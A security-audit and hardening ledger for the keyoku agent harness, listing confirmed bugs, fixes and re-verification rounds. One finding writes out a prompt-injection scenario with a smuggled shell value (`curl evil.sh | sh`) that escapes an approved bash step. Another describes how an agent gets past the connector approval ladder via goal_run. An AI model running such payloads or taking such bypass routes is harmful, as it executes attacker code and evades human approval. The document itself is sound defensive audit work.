# Keyoku validation — adversarial refute ledger (2026-07-02)

Source: 47-agent read-only refute (6 lenses, independent skeptic verification) + universe-sim E2E + claims audit, run against keyoku@2.17.0. Every item below is CONFIRMED (2 findings were refuted and dropped; 0 left merely plausible).

**Status legend:** ✅ fixed+regression-tested this pass · 🔧 fix-ready (file:line + sketch, one atomic step) · 📄 documented-limitation (already known/defensible)

## Fixed this pass
- ✅ **[HIGH] Silent false convergence** `src/engine.ts` — negative/vacuous ops (`ne`/`not_contains`/`not_exists`/`falsy`) on transport fields passed when the probe never ran (service down → `status ne 500` converged; timeout → `exitCode ne 2` converged). Fix: exemption now requires a positive op AND a present non-null transport value. Regression test added (http dead-port, command timeout, failed-command stderr).
- ✅ **[LOW] Nudge cache files world-readable** `src/nudge.ts` + `src/index.ts` — ripe.json/surfaced.json/paused/hook.counter written 0644, breaking the advertised 0600 posture. Fix: `{mode:0o600}` on all four writers; regression test in tests/nudge.test.ts. (Found by the universe sim.)
- ✅ **[T0] 10 TypeScript errors** cleared (shipped by publisher in 2.17.0 / commit 75133c0).

## HIGH — fix-ready (6)
- 🔧 **src/server.ts:1153** — activity_record and goal_record MCP tools bypass redactSecrets — secrets persist and propagate to repo-committed artifacts
  - Scenario: An agent calls activity_record { summary: "Bash: deploy", tool: "Bash", type: "shell", detail: "curl -H 'Authorization: Bearer eyJhbGci…' https://api.internal/deploy" } — exactly the manual use the tool description invites ('can also be called manually for significant events'). The bearer token lands verbatim in activi
  - Fix: Apply redactSecrets to summary and detail in the activity_record handler (src/server.ts:1150-1159) before constructing the ActivityEvent, and in Engine.recordAction (src/engine.ts:529-538) to input.summary/input.detail (also cap detail at 500 chars there for consistency). Add an e2e test in tests/wo
- 🔧 **src/server.ts:1589** — workflow_execute {{param}} values inject arbitrary shell, bypassing the approval trust boundary
  - Scenario: Human approves template step: bash command `gh pr create --title "{{title}}" --body "done"`. A prompt-injected agent (e.g. instructions embedded in a file/PR it is summarizing) calls workflow_execute { slug, params: { title: 'x"; touch /tmp/keyoku_pwned; curl evil.sh | sh; echo "' } }. fillPlaceholders yields `gh pr cr
  - Fix: In workflow_execute, only bash `command` fields need code/data separation. Shell-escape each param value before substitution into a bash step's command — wrap in single quotes and escape embedded single quotes as `'\''` (leave prompt/message fields as raw text). Better still, keep placeholders unsub
- 🔧 **src/engine.ts:659** — Activity backfill lifts an unrelated concurrent session's work into the workflow, discarding the goal's real steps
  - Scenario: Verified by repro: goal 'ship the harness fix' converges build-then-verify with nothing recorded; its own session s1 logged 3 real actions (fix, build, test in /Users/me/harness) inside the window, while concurrent session s2 logged 8 Edit events in /Users/me/jobsearch. Promoted workflow steps = the 8 jobsearch edits; 
  - Fix: Before the most-events vote in backfillStepsFromActivity, pin the owning session from an available ownership signal: the goal's own mcp__keyoku__goal_* bookkeeping events in the window (nearest goal_create/goal_assess to createdAt, matching the goal slug/id in detail where present) or the focus stat
- 🔧 **src/server.ts:1695** — execution_cancel cannot stop a running execution; remaining steps still execute and the final save silently overwrites the cancelled record with 'done'
  - Scenario: Template: [bash 'run 25s migration', bash 'announce + email team']. workflow_execute starts; the MCP client's 60s request timeout (or the user, from a second session/watch CLI sharing the store) triggers execution_cancel while step 0 runs. Response says {cancelled:true, status:'failed'}. Step 0 then completes server-si
  - Fix: Between steps in advanceExecution (top of the loop, before marking the step running, and again after each await), re-read the persisted record via harness.store.getExecution(exec.id); if its status is 'failed' (cancelled), return immediately without saving the stale copy — optionally paired with an 
- 🔧 **src/run.ts:122** — goal_run / goal_converge / goal_guardrails bypass the connector autonomy ladder entirely — mutating Omnigent calls execute on an 'approve' (or even 'observe') connector with no approval
  - Scenario: User sets the omnigent connector to 'observe' (or leaves the preset's 'approve') expecting a human decision before the harness touches their Omnigent server. An agent calls connector_call{name:'omnigent', tool:'post_event...'} and is correctly refused/queued — then calls goal_run or goal_converge on any goal, and the h
  - Fix: In runGoalOnOmnigent (src/run.ts, after ensureOmnigentConnector) and in the goal_converge/goal_guardrails handlers (src/server.ts), resolve the omnigent connector and consult gateCall/connectorAutonomy once up front: refuse with the standard ladder guidance on observe/suggest, and on 'approve' eithe
- 🔧 **src/index.ts:942** — doctor false-greens all four wiring checks via naive substring matching
  - Scenario: User's init fails or they remove keyoku (claude mcp remove keyoku), but settings.json contains any unrelated hook like `asciinema record ...` / `npm run brief-metrics` / `my-tool context-load`, and ~/.claude.json history contains a prompt "keyoku". `keyoku doctor` prints all four checks green and 'All core checks passe
  - Fix: Parse both files as JSON instead of substring-matching: for each of hooks.PostToolUse/SessionStart/UserPromptSubmit in ~/.claude/settings.json, require an entry whose command matches /(^node .*keyoku.*index\.js|keyoku) (record|brief|context)$/ and verify the node script path in that command exists v

## MEDIUM — fix-ready (12)
- 🔧 **src/engine.ts:543** — Retroactive goal_record inflates workflow stats.convergences by one per record
  - Scenario: Agent does the work first, then goal_create + goal_assess -> converges with iterationsUsed 0 and no workflow. Following the guidance it records its 3 real steps via goal_record. Result: workflow stats.convergences = 3 (verified: 'B after 3 retroactive records -> convergences: 3') though the goal converged once. A later
  - Fix: Give promoteWorkflow an option (e.g. countConvergence: boolean): fresh-convergence callers pass true; the retroactive path in recordAction passes false so it refreshes steps/pitfalls/totalActions but keeps existing.stats.convergences unchanged (still creating the workflow with convergences: 1 when n
- 🔧 **src/server.ts:1419** — Approved workflow templates are silently overwritten via colliding slugs (position-based auto slugs; uniqueSlug ignores templates)
  - Scenario: Day 1: user approves suggestion `auto-bash-1` (npm test → git push). Weeks later workflow_suggest ranks a different repeated sequence first — also slugged `auto-bash-1` — and the agent approves it as guided. The original template's steps are silently destroyed; the already-published `/keyoku:auto-bash-1` MCP prompt and
  - Fix: Make workflow_approve refuse when a template with that slug already exists unless an explicit overwrite:true flag is passed (or at minimum return an "overwrote existing template X (ran N times)" warning and reset timesRun to 0 when steps change); derive detectPatterns slugs from the content key (e.g
- 🔧 **src/store.ts:325** — listAudit is the only JSONL reader that crashes on a corrupt line — one torn append darkens audit_list and `keyoku audit`
  - Scenario: Disk fills while appendAudit writes an entry (or the hook process is killed mid-append). From then on, every audit_list MCP call (server.ts:924) and `keyoku audit` CLI invocation (index.ts:1273) throws 'Unexpected end of JSON input' / 'Unterminated string in JSON' whenever the bad line is within the last `limit` lines 
  - Fix: In listAudit (src/store.ts:318-326), match the sibling readers: parse with `.flatMap((l) => { try { return [JSON.parse(l) as AuditEntry]; } catch { return []; } })` over all non-empty lines, then `.slice(-limit)` on the parsed array (as listActivity does at :368-377) so a torn line is skipped instea
- 🔧 **src/activity.ts:159** — redactSecrets leaks Basic-auth credentials (mis-redacts the wrong token) and DB connection-string passwords
  - Scenario: User (or agent) runs `curl -H "Authorization: Basic dXNlcjpwYXNzd29yZA==" https://api.example.com` or `psql postgres://admin:s3cr3tPass@db:5432/prod`. The PostToolUse hook records the Bash command; redactSecrets leaves the base64 credential / DB password in ~/.keyoku/activity.jsonl. That command later becomes a workflo <!-- gitleaks:allow -- synthetic validation example -->
  - Fix: In src/activity.ts add a BASIC_RE analogous to BEARER_RE (/\b(basic\s+)[A-Za-z0-9+\/=]{8,}/gi → "$1«redacted»", applied before SECRET_ASSIGNMENT_RE and also matching inside quotes) and a URL-userinfo rule (/(\/\/[^\s\/:@"']+:)[^\s@"']+@/g → "$1«redacted»@") covering postgres://user:pass@host-style s
- 🔧 **src/engine.ts:589** — Re-promotion of a workflow silently wipes the self-pruning stats (suggested/helped), defeating precision ranking
  - Scenario: Verified by repro: workflow with stats {convergences:1, suggested:5, helped:0} (a proven word-match-only workflow that would rank at the 0.25 precision floor) drifts and re-converges once → stats become {convergences:2, totalActions:1} with suggested/helped gone → precision multiplier returns to 1.0 and the noisy workf
  - Fix: In promoteWorkflow's existing-workflow branch (engine.ts:589), spread the prior stats: stats: { ...existing.stats, convergences: existing.stats.convergences + 1, totalActions: trace.length } — preserving suggested/helped (and any future optional counters). Add a test in the self-pruning describe blo
- 🔧 **src/server.ts:1653** — execution_complete accepts steps that are not waiting — enables double-execution of all subsequent steps and fabricated completion of approval-gated steps
  - Scenario: Realistic trigger for (a): a workflow whose bash steps total >60s exceeds the MCP client's default request timeout; the client abandons the workflow_execute call (server keeps running it — SDK cancellation doesn't abort the handler), the agent 'recovers' via execution_list → sees currentStep=1 'running' → calls executi
  - Fix: In execution_complete, reject unless step.status is 'waiting_agent' or 'waiting_human' (running/pending/done steps cannot be agent-completed); store approvalId on the step when enqueuing at server.ts:1010, and require that approval's status be decided (executed/failed/denied — mapping denied to step
- 🔧 **src/executor.ts:19** — Bash step timeout (and server shutdown) kills only the direct `sh` child — grandchildren keep running after the step is reported failed
  - Scenario: Step command `npm run deploy | tee deploy.log` hangs at 30s. keyoku SIGTERMs/SIGKILLs `sh`; the npm→node deploy process is orphaned and completes the deploy minutes later, while the execution record says the step failed and the agent, believing deploy failed, re-runs the workflow → double deploy. Or: user Ctrl-C's keyo
  - Fix: Spawn with `detached: true` so the child leads its own process group, and on timeout signal the whole group: `process.kill(-child.pid, "SIGTERM")` then escalate with `process.kill(-child.pid, "SIGKILL")` (fall back to child.kill if -pid throws); keep a module-level Set of in-flight children and, in 
- 🔧 **src/server.ts:1161** — keyoku pause does not stop MCP-server-side recording — activity_record/goal_record keep writing while paused
  - Scenario: User runs `keyoku pause` for a privacy-sensitive session, keeps working in Claude Code with the keyoku MCP server connected; the agent follows the keyoku protocol and calls goal_record/activity_record — the paused store silently accumulates summaries/commands of the sensitive work, which later feed pattern mining and p
  - Fix: Export a shared isPaused(dir) helper (existsSync(join(store.dir, "paused"))) from store.ts and check it per-call at the top of the server-side write tools — activity_record, goal_record, knowledge_submit, workflow_capture, and the autoRecordToFocusGoal path — returning {recorded:false, paused:true} 
- 🔧 **src/index.ts:875** — export writes YAML-invalid SKILL.md frontmatter whenever the workflow description contains a colon
  - Scenario: Template description 'Deploy checklist: run tests, then push' → `keyoku export fix-parser` writes .claude/skills/fix-parser/SKILL.md whose frontmatter line is `description: Deploy checklist: run tests, then push...`; YAML parse fails ('Nested mappings are not allowed in compact mappings'), the skill silently never appe
  - Fix: Emit the frontmatter with proper YAML quoting — e.g. build it via yaml.stringify({ name: template.slug, description: desc }) from the existing yaml dependency, or wrap the description in JSON.stringify(desc) (a valid YAML double-quoted scalar) after the newline replace. Add a case to tests/export.te
- 🔧 **src/index.ts:1159** — init re-runs duplicate all three hooks when the install path lacks the literal string 'keyoku' (and delete unrelated hooks that contain it)
  - Scenario: Developer clones the repo to ~/src/harness, runs `node dist/index.js init` after each upgrade (three times) → settings.json holds 3 identical PostToolUse hooks; every Bash call is written to activity.jsonl 3× with slightly different timestamps → learn/workflow_suggest sees 3× frequencies and promotes noise; keyoku stat
  - Fix: Replace the substring heuristic with a structural predicate: treat an entry as keyoku's iff any inner hook command matches /^node .+ (record|brief|context)$/ (or equals the previously-recorded selfPath command persisted in ~/.keyoku), so idempotency no longer depends on the install path spelling and
- 🔧 **src/index.ts:760** — Practice injection is hardcoded to a '/Development/<proj>/' directory layout — silently inert for everyone else
  - Scenario: User keeps code at ~/code/myapp, accumulates practice knowledge (subject practice:myapp), prompts 'deploy the staging build like usual' from ~/code/myapp → hook outputs nothing. Same store, same prompt with cwd /Users/dev/Development/myapp → injects '[keyoku] House pattern in myapp: ...'. The shipped npm feature only w
  - Fix: Replace the /Development/ regex with a layout-agnostic project derivation: walk up from cwd to the nearest directory containing a project marker (.git, package.json, or CLAUDE.md) and use its basename, falling back to basename(cwd); use the same derivation (from the event's cwd, not the summary text
- 🔧 **src/omnigent-guardrails.ts:98** — run/converge convergence loop never waits for the Omnigent agent — burns maxRounds at probe speed and spams the session
  - Scenario: `keyoku run migrate-db --on omnigent` on a goal whose probes take ~5s: keyoku posts the task, then in ~100s fires 20 assess/post cycles, dumping 20 'Still not done' user messages into the session while the agent is still on its first minutes of work, exits 1 reporting 'did not converge after 20 round(s)', and leaves th
  - Fix: Pace rounds on agent progress instead of probe speed: after posting a continuation, poll the Omnigent session via the existing openapi connector (e.g. GET session/events) until the agent's turn since the last post has completed (with a configurable per-round timeout), or at minimum sleep a configura

## LOW — fix-ready (8)
- 🔧 **src/engine.ts:576** — Failure-only traces learn pitfalls that can never surface, while guidance claims a workflow was promoted
  - Scenario: Agent tries an approach, records it with result:'failure', the environment converges anyway (or a teammate's fix lands) and the final assess passes. Verified: workflow created with steps.length 0 and pitfalls ['tried bumping timeout']; guidance falsely matches 'has been promoted'; a similar later goal gets 0 suggestedW
  - Fix: In engine.ts:480, key workflowPromoted on learnable steps rather than existence: `(this.store.getWorkflow(fresh.slug)?.steps.length ?? 0) > 0`, so a steps-less pitfall-only artifact still triggers the record-your-steps nudge and retroactive records repair it (line 586 already preserves pitfalls). Op
- 🔧 **src/store.ts:130** — deleteGoal removes records but orphans observations/<goalId>.jsonl forever
  - Scenario: User creates and later deletes 50 goals over months (goal_delete after each experiment). ~/.keyoku/observations/ retains 50 dead .jsonl files with the deleted goals' full assessment histories; a user who deleted a goal to purge references to an internal system finds its criterion ids and probe-state summaries still on 
  - Fix: In Store.deleteGoal (store.ts:130), add `rmSync(this.observationsFile(id), { force: true });` alongside the records removal (make observationsFile reachable there; it is already a private method on the same class). Extend the existing tests/store.test.ts case "deletes goals and their records" to app
- 🔧 **src/store.ts:435** — executions.json is unbounded and fully rewritten (pretty-printed) on every workflow step — an undocumented growth gap
  - Scenario: A user triggers a 10-step workflow via hooks several times a day. Each run adds ~20 KB of step results permanently; after six months executions.json is tens of MB, and every single workflow step then pays a synchronous full-file read + pretty-printed rewrite inside the MCP request path — workflow execution latency degr
  - Fix: In Store.saveExecution (src/store.ts:435), after the upsert, cap the collection the way activity.jsonl caps: keep all in-flight executions (status running/waiting_agent/waiting_human) plus the most recent N (e.g. 200) terminal ones (done/failed), then write. Update the PRODUCTION-READINESS.md growth
- 🔧 **src/engine.ts:823** — Negative muscle memory from failure-only traces is captured but never surfaced: pitfalls-only workflows are filtered out everywhere
  - Scenario: Verified by repro: goal 'fix-flaky-auth' converges after the agent honestly recorded two failed attempts (result:'failure') and no success (fix happened outside the recorded/activity trace — e.g. no hooks installed). Workflow saved with steps:0, pitfalls:['Tried bumping the timeout','Tried mocking the clock badly']. A 
  - Fix: In suggestWorkflows (engine.ts:823) and candidatePool (engine.ts:909), widen the filter to `w.steps.length > 0 || (w.pitfalls?.length ?? 0) > 0` — guidance.ts:151 already renders '(no recorded steps)' for empty steps, and recordSuggestionOutcomes's existing steps.length===0 skip (engine.ts:790) must
- 🔧 **src/refine.ts:71** — workflow_suggest labels raw heuristic noise as 'Model-refined drafts' when the SLM correctly drops all drafts
  - Scenario: detectPatterns mines 2 coincidental automation sequences (e.g. interleaved one-off commands that happened to repeat 3x); the configured SLM correctly returns {"suggestions":[]}; workflow_suggest responds with the 2 noise drafts, method 'heuristic+gemini', and 'Model-refined drafts. Review and approve...' — the agent, t
  - Fix: Make refineSuggestions distinguish outcomes: honor a well-formed empty suggestions array as the model's drop-all verdict (return []), or return { suggestions, refined: boolean } and have workflow_suggest set method/guidance only when refined is true (this also fixes the throw/malformed paths being s
- 🔧 **src/server.ts:980** — Bash steps with no command execute the human-readable summary as a shell command
  - Scenario: SLM-refined or hand-authored template contains {type:'bash', summary:'archive logs older > 30 days'} (command lost in refinement). workflow_execute runs `sh -c 'archive logs older > 30 days'`: the shell performs the redirection — creating/truncating a file named `30` in the cwd — before failing with 'archive: command n
  - Fix: Drop the `?? s.summary` fallback at src/server.ts:980 and fail fast like mcp_call: `if (!s.command) { s.status = "failed"; s.error = "bash step is missing command"; return failAt(i, s.error); }`; additionally add a superRefine to the shared step schema in workflow_approve/workflow_update rejecting t
- 🔧 **src/index.ts:1201** — init reports Codex 'already wired' without healing a stale path, and doctor cannot detect the breakage
  - Scenario: User upgrades node via nvm (global root changes), reinstalls keyoku, re-runs `keyoku init`: Claude hooks get the new path, output says 'Codex: already wired', but ~/.codex/config.toml still points to the old, now-empty node_modules path — Codex silently fails to start the keyoku server, and `keyoku doctor` shows ✓ Code
  - Fix: In init's Codex branch, parse the existing [mcp_servers.keyoku] block and, if its args path differs from selfPath (or no longer exists on disk), regex-replace that block with the freshly generated one instead of printing 'already wired' (escape backslashes in selfPath when emitting the TOML string).
- 🔧 **src/dispatch.ts:141** — Degraded dispatch hardcodes agent 'codex-native-ui' and ignores the live agent list it just fetched
  - Scenario: User without GEMINI_API_KEY/ANTHROPIC_API_KEY runs `keyoku run ship-it --on omnigent` against an Omnigent whose agents are named e.g. 'codex' and 'claude': dispatch 'selects' codex-native-ui (degraded), session creation errors ('creating Omnigent session failed: ...agent not found...'), exit 2 — even though valid agent
  - Fix: In the degraded branch, move the opts.agents.length===0 guard above it and choose from the fetched list: return OFFLINE_DEFAULT_AGENT only if it appears in opts.agents, else fall back to opts.agents[0].name (keep degraded:true and the rationale). Update the pinned test in tests/dispatch.test.ts ("re

## Advertising-conformance claims audit
- **verified: 40** claims deliver as advertised.
- **partial: 5**
  - README Get Started: running `npx keyoku init` from the throwaway npx cache is refused — So `npx keyoku init` succeeds (correctly retargeted) if keyoku is already globally installed — refusal is the no-global-install case only. Behavior is
  - README Get Started: state lives in ~/.keyoku with the same file permissions as ~/.aws — keyoku inspect's own perms check (index.ts:1378) does not list ripe.json/surfaced.json either.
  - README/CLI: `keyoku pause` is a privacy switch that stops ALL recording and injection instantly — The dominant recording path (hooks) does stop; the MCP-side path is an unadvertised exception.
  - README 2b / CLI: `keyoku refine <slug>` turns noisy captured steps into a tight, {{parameterized}} template ready to run — Without an SLM key the advertised {{parameterized}} output does not happen; cli-lifecycle.test.ts:98 only tests the collapse.
  - HARNESS.md M4 shipped: per-connector autonomy ladder enforced in connector_call, approvals queue with human decisions (a — Both caveats are reasonable engineering; the marketing wording just oversells 'human' and 'append-only'.
- **stale-doc: 5**
  - README CLI table: `keyoku status` shows goals, templates, connectors — Also makes exportCmd's error hint (index.ts:811 "No approved workflow '<slug>'. See: keyoku status") point at a command that can't show templates.
  - HARNESS.md M1: the package is `@keyoku/harness` — package.json:2 — the npm package name is "keyoku" (bin "keyoku"), matching the README badge and npmjs.com/package/keyoku. No @keyoku/harness package i
  - PRODUCTION-READINESS: "audit.jsonl and knowledge.jsonl are unbounded (both small today); add the same size-cap if they g — Half the sentence is stale (audit), half still accurate (knowledge). The doc should say only knowledge.jsonl is unbounded.
  - PRODUCTION-READINESS Tier 3: "Still wanted: … a `keyoku inspect` that shows exactly what's in ~/.keyoku" — Same section's other wants (retention policy, scoping/opt-out) remain genuinely open — pause is all-or-nothing.
  - PRODUCTION-READINESS Tier 3: "the site/README/quickstart should teach the new flagship (goal_focus)" — Cannot verify the marketing site from the repo.
- **needs-live-e2e: 6**
  - README Get Started: `keyoku init` registers the MCP server via `claude mcp add --scope user` so Claude Code connects on  — Fallback path (direct ~/.claude.json edit) is not advertised but is strictly more robust.
  - README: approved workflows appear as native slash commands (MCP prompts) in the agent — Simulation-gate candidate: verify /workflow-<slug> appears in a live Claude Code session.
  - README How It Works 2: with GEMINI_API_KEY or ANTHROPIC_API_KEY the SLM refines drafts — filters coincidences, names wor — Offline tests only prove the plumbing and fail-safe, not the refinement quality.
  - README Configuration: KEYOKU_ENGINE_URL connects keyoku-engine — knowledge mirrors into it and queries upgrade to semant — Degrades silently to local JSONL on any failure — advertised behavior preserved offline.
  - README/HARNESS.md: Codex is wired automatically — when ~/.codex exists the MCP server lands in config.toml (same tools,  — keyoku import's Codex transcript ingestion IS offline-tested (import.test.ts:84).
  - MCP tools goal_converge / goal_run / goal_guardrails: drive an Omnigent session to convergence with compiled constraint  — Not advertised in README — no conformance gap, just flagging for the simulation gate.

## Coverage gaps (refute self-critique — not yet probed)
- keyoku-engine bridge (brain.ts, KEYOKU_ENGINE_URL) was never driven live — the whole 'knowledge mirrors into the engine and queries upgrade to semantic search' claim (needs-live-e2e) is unverified. Two unprobed failure modes: knowledge_quer
- The live SLM refinement path (slm.ts + refine.ts, README 'How It Works 2') was never exercised against a real/faked provider — only the 'Model-refined drafts' mislabel was caught. Unprobed: attacker/tool-controlled captured step text flows 
- The Omnigent convergence lifecycle (run.ts / omnigent-guardrails.ts; goal_converge/goal_run/goal_guardrails, all needs-live-e2e) was verified only by static reading. Nobody drove even a simulated Omnigent session to confirm the compiled con
- init agent-wiring (index.ts) was never executed against a staged HOME: neither `claude mcp add --scope user` (README Get Started, needs-live-e2e) nor the ~/.codex/config.toml write was run, so 'the server connects on next launch' and 'Codex
- MCP prompts as native slash commands: workflow-e2e asserts only the listPrompts COUNT. Nobody verified prompt CONTENT / argument-schema round-trip — that {{placeholders}} map to prompt arguments, that workflow_update/rename refreshes the pu
- Probe RESPONSE-body secret exposure was missed. redactCriteria (server.ts:113) masks only http REQUEST headers; the goal_assess response's criteria[].actual echoes raw probe OUTPUT unredacted — an http probe against an authed endpoint (or a
- Store-at-rest permissions were audited only for the nudge cache. connectors.json holds raw connector credentials (env/headers/auth) at rest and approvals.json stores args verbatim, yet nobody enumerated actual on-disk modes of goals.json / 
- The unbounded-growth claim (PRODUCTION-READINESS 'audit.jsonl and knowledge.jsonl are unbounded; add the same size-cap if they grow', marked stale-doc) was left unverified. grep confirms store.ts still has NO cap/trim on knowledge.jsonl or 
- The confirmed redactSecrets mis-redaction (Basic-auth / DB-connection-string passwords) was found in activity.ts but never traced through the transcript-import path (index.ts import). import.test.ts asserts SOME redaction happens but not th
- Test-suite blind spots over real MCP stdio: (a) budget-exhaustion→blocked→goal_update{status:'active'} NON-bypass is unit-tested in engine.test.ts but never driven end-to-end through dist/index.js; (b) execution crash-RESUME (server killed 

---

# HARDEN COMPLETE — addendum (2026-07-02, same day)

Directive: fix everything, fully test end-to-end, production-ready. **27 of 28 confirmed findings fixed**, each with a regression test. Gates: typecheck ✓ · **312 vitest** (from 290) ✓ · **universe sim 9/9 deterministic** ✓ · dogfood convergence goal ✓.

## Fixed (with regression test)
- **engine.ts** — false-convergence exemption (positive-op + present-value); retroactive-record convergence-count no longer inflated (`countConvergence` flag); re-promotion preserves self-pruning stats (`...existing.stats`); `workflowPromoted` keyed on runnable steps (honest guidance); pitfalls-only workflows surface on similar goals; backfill prefers goal-owning session (focus/bookkeeping) over raw event volume.
- **server.ts** — **quote-state-aware {{param}} binding** (env-var references chosen by shell quote state → injection-safe in every context, substitution preserved); `execution_cancel` actually stops a RUNNING execution (cancel flag + store re-read, no overwrite); `execution_complete` rejects non-waiting steps; `workflow_approve` refuses slug collision without `overwrite:true` + rejects bash step with no command; no `?? summary` fallback for bash command; `keyoku pause` stops server-side recording (activity_record/goal_record/knowledge_submit).
- **store.ts** — `listAudit` tolerates torn lines; `deleteGoal` removes observations; `executions.json` capped (200 terminal, all in-flight kept); `isPaused()` helper.
- **run.ts / omnigent-guardrails.ts / dispatch.ts / refine.ts** — Omnigent drive gated by the connector autonomy ladder (`assertOmnigentDriveAuthorized`); convergence loop paces with an injectable/env-configurable wait; degraded dispatch honors the live agent list; refine honors the model's drop-all verdict instead of relabeling raw drafts.
- **activity.ts / executor.ts** — `redactSecrets` masks Basic-auth, DB/URL userinfo passwords, and skips the wrong-token mis-redaction; bash steps run in their own process group (timeout/shutdown kills grandchildren) + `killAllBashSteps` on serve shutdown, which also fails stranded running executions.
- **index.ts** — `doctor` + `init` identify keyoku hooks structurally (no substring false-green, no duplicate/foreign-hook deletion); `doctor` parses settings/claude.json as JSON and flags a stale Codex path; `init` heals a stale Codex path; `export` frontmatter is JSON-quoted (valid YAML even with `:` / `#` / `[`).
- **types.ts** — `WorkflowExecution.paramEnv` for safe param binding across resume.
- **Docs** — HARNESS.md package name (`keyoku`), PRODUCTION-READINESS growth-bound caps.

## Deferred (1) — documented, not rushed
- **index.ts:760 practice-injection hardcoded `/Development/<proj>/`** (MEDIUM, generality-only). Silently inert for users whose repos aren't under `/Development` — but this user's are, so it works for them today. A correct fix couples the query side (index.ts `context`) to the filing side (server.ts `practiceSubject`) via the event `cwd`, a data-flow change with learning-pipeline regression risk. Fix path: derive project by walking up to the nearest `.git`/`package.json`/`CLAUDE.md` from the event cwd, used identically on both sides.

---

# ADVERSARIAL RE-VERIFICATION (3 rounds) — addendum

The initial harden (27/28) was put through independent adversarial re-verification. This is what the gate caught and how it was closed — the value of refuting your own fixes:

- **Round 1 (11 skeptics)** found 8 of my fixes were incomplete (5 HIGH bypasses, 2 MED, 1 LOW); 3 held (param-injection, execution-cancel, store-integrity). All 8 re-fixed with regression tests.
- **Round 2 (8 skeptics)** confirmed 7 of the 8 re-fixes sound; **false-convergence** still bypassable (my op-name carve-out admitted tautological positive ops — `exitCode gte 0`, `error exists` — on a completed-failed probe) + a new LOW doctor false-positive (broadened hook regex matched `keyoku` as a data arg). Both re-fixed; the backfill "refuse-to-guess" attempt was reverted (broke a documented behavior contract).
- **Round 3 (2 skeptics)** confirmed the doctor fix sound and found the LAST false-convergence gap — **upstream**: `runHttp` never set an error for a non-2xx status, so an HTTP 500 with a parseable body converged on a body assertion. Fixed at the source (`runHttp` marks non-2xx as a completed-but-failed probe), with an end-to-end test (500-body assertion → not converged; `status eq 500` → converged).

**Final false-convergence design** (the "one unforgivable bug", hardened across 4 iterations): a probe that did not COMPLETE (command timeout/-1 sentinel, HTTP no-response, null output, mcp error) can never satisfy a criterion; a completed-but-FAILED probe (nonzero exit / non-2xx HTTP) only satisfies a criterion that DELIBERATELY inspects the failure (exact `exitCode`/`status`, or specific `error` content) — every tautological/negative/vacuous shape fails. Uniform across command / HTTP / mcp.

**Final gates:** typecheck ✓ · **321 vitest** (from 290 baseline; +31 regression tests) ✓ · universe sim 9/9 ✓ · dogfood convergence goal ✓. A final focused re-verify of the HTTP fix is the last confirmation.

## Round 3 verify → final false-convergence close (round 5 of that fix)
The HTTP fix was confirmed closed + regression-free, but the same skeptic found the LAST residual: the `error`-path exemption allowed tautological matches — `error matches '.*'`, `error contains 'code'`/`'exited'` — because those generic tokens live in the harness's OWN synthesized error string ("command exited with code N"), so they'd pass for any failed probe. FINAL FIX: the failure exemption is now a single, provably-non-tautological shape — `(exitCode|status) eq <exact value>`. Exact-equality on the real failure value cannot pass vacuously (it must match the specific code/status), and every `contains`/`matches`/range/negative op plus the error-message path are removed from the exemption. Tautology class eliminated by construction, uniform across command/HTTP/mcp. Gates: typecheck ✓ · 321 vitest ✓ · sim 9/9 ✓ · dogfood converged. (No 6th verify round dispatched — the exemption now contains no op capable of a vacuous pass; and shared quota was near its floor.)
